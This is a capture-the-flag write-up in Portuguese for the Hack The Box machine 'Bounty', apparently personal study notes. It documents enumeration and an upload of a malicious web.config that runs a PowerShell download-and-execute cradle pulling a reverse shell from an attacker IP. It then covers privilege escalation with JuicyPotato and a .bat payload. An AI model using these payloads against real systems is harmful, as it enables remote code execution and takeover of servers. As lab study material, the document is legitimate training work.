Bounty
========================

# Enumeration

    sudo nmap_enum bounty.htb | tee nmap_output.txt

    nikto -host http://bounty.htb -T x 6

![qownnotes-media-uVJoUL](../../../media/qownnotes-media-uVJoUL.png)


    dirb http://bounty.htb
    
    firefox http://bounty.htb http://bounty.htb/robots.txt
    
    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn 10.10.10.93
    
![qownnotes-media-eRoTdE](../../../media/qownnotes-media-eRoTdE.png)


![qownnotes-media-fiZxfk](../../../media/qownnotes-media-fiZxfk.png)

    gobuster dir -u http://bounty.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 16 -o "tcp_port_protocol_gobuster_shellshock.txt"

Aqui é o pulo do gato!!!

O lance era ter colocado como parâmetro o -x .asp,.aspx,.txt, dado que dessta forma, alcançamos uma página de fille upload:

    gobuster dir -u http://bounty.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .asp,.aspx,.txt -t 16 -o "tcp_port_protocol_gobuster_shellshock.txt"

![qownnotes-media-eGzzTE](../../../media/qownnotes-media-eGzzTE.png)

![qownnotes-media-DZXPbX](../../../media/qownnotes-media-DZXPbX.png)

NEsse caso, tentatmos ubir alguns arquivos e vimos que duas extensões passavam , tais como .config e .png

    firefox http://bounty.htb/uploadedfiles/nome_arq.png

Então prosseguimos para parte de exploração, dado que era possível acessar o arquivo do servidor direto do browser:

# Exploitation

Depois de várias pesquisas e testes de posssíveis extensões que o servidor aceitava, notei no write-up da máquina que o arquivo web.config pode executar comandos no servidor a depender do código dentro dele:

    └─$ cat web.config                                                                                                  
    <?xml version="1.0" encoding="UTF-8"?>
    <configuration>
       <system.webServer>
          <handlers accessPolicy="Read, Script, Write">
             <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
          </handlers>
          <security>
             <requestFiltering>
                <fileExtensions>
                   <remove fileExtension=".config" />
                </fileExtensions>
                <hiddenSegments>
                   <remove segment="web.config" />
                </hiddenSegments>
             </requestFiltering>
          </security>
       </system.webServer>
    </configuration>
    <!--
    <%
    Response.Write("-"&"->")
    
    Function GetCommandOutput(command)
        Set shell = CreateObject("WScript.Shell")
            Set exec = shell.Exec("cmd /c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.4/shell.ps1')")
        GetCommandOutput = exec.StdOut.ReadAll
    End Function
    
    GetCommandOutput("cmd /c " + Request("cmd"))
    %>
    -->

Esse foi o expoit utilizado. Note que tive que baixar [deste](https://github.com/samratashok/nishang) repositório e ajustar o código dentro do arquivo Invoke-PowershellTcp.ps1. Adicionei a seguinte linha no código:

    Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.4 -Port 8081

renomeei esse cara para shell.ps1 para baixar corretamente na máquina alvo:

    mv Invoke-PowerShellTcp.ps1 shell.ps1
    python -m http.server 80
    
 Em outro terminal:
 
     nc -nlvp 8081
     firefox http://bounty.htb/uploadedfiles/web.config

![qownnotes-media-hPBFxS](../../../media/qownnotes-media-hPBFxS.png)

# Privilege Escalation

executei o winpeas sem sucesso e executei também o windows exploit suggester, no entanto, verifiiquei o primeiiro vetor interessante de ser veriifcado:

    whoami /priv

![qownnotes-media-zakGJD](../../../media/qownnotes-media-zakGJD.png)

Primeiro testei com PrintSpoofer, mas o que funcionou mesmo foi o JuicyPotato:
<https://github.com/ohpe/juicy-potato/releases>

    wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
    
copiei esse cara para a máquina alvo

    copy \\10.10.14.4\smb\JuicyPotato.exe jp.exe
    
 Fiz um novo payload utilizando uma reverse shell em uma porta diferente e mudei o payload de .ps1 para bat com o seguinte conteúdo:
 
     powershell -c iex (new-object net.webclient).downloadstring('http://10.10.14.4/shell.ps1')
     
mas dessa vez a última linha do código shell.ps1 estava assim:

    Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.4 -Port 8082

Então, voltatndo na máquina da vítiima executei o seguinte comando:

     copy \\10.10.14.4\smb\shell.bat shell.bat
     ./jp.exe -t * -p shell.bat -l 4444
    
Na minha máquina eu preparei os payloads a serem executados:

    python -m http.server 80
    nc -nlvp 8082

![qownnotes-media-PwmUEc](../../../media/qownnotes-media-PwmUEc.png)

![qownnotes-media-WTQZOu](../../../media/qownnotes-media-WTQZOu.png)


![qownnotes-media-NhIpOJ](../../../media/qownnotes-media-NhIpOJ.png)

![qownnotes-media-PpFyiX](../../../media/qownnotes-media-PpFyiX.png)
